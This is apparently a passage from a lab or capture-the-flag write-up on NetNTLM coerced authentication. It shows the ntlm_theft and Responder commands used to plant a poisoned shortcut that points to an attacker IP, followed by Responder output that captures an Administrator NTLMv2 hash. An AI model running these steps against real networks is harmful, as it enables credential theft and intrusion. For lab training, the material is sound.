

Usage for NetNTLM coerced authentication:
```
python3 ntlm_theft.py -g lnk -s 10.8.1.167 -f stealthy           // Using https://github.com/Greenwolf/ntlm_theft to generate a poisoned shortcut file for a target to click on, making them attempt to connect to our system.
responder -I tun0
```
##### responder output:
```
┌─[✗]─[root@edu-virtualbox]─[/tmp]
└──╼ #responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.8.1.167]
    Responder IPv6             [fe80::eb56:1a62:ce6d:daea]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-LX1COFHUR4A]
    Responder Domain Name      [N6JC.LOCAL]
    Responder DCE-RPC Port     [45533]

[+] Listening for events...

[!] Error starting TCP server on port 1883, check permissions or other servers running.
[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.10.27.118
[SMB] NTLMv2-SSP Username : ELFHQSERVER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::ELFHQSERVER:66cb6dcdbc66ad72:2C3D62867A26F268C6B7A1B7F7A2C9A4:010100000000000000F71806B936DA017138201B5FF1A50000000000020008004E0036004A00430001001E00570049004E002D004C005800310043004F0046004800550052003400410004003400570049004E002D004C005800310043004F004600480055005200340041002E004E0036004A0043002E004C004F00430041004C00030014004E0036004A0043002E004C004F00430041004C00050014004E0036004A0043002E004C004F00430041004C000700080000F71806B936DA010600040002000000080030003000000000000000000000000030000083B872B978E45D895491A86BFACA8B8F91F0235CCBC785DBFB41903C57E891D10A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0038002E0031002E003100360037000000000000000000
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
```
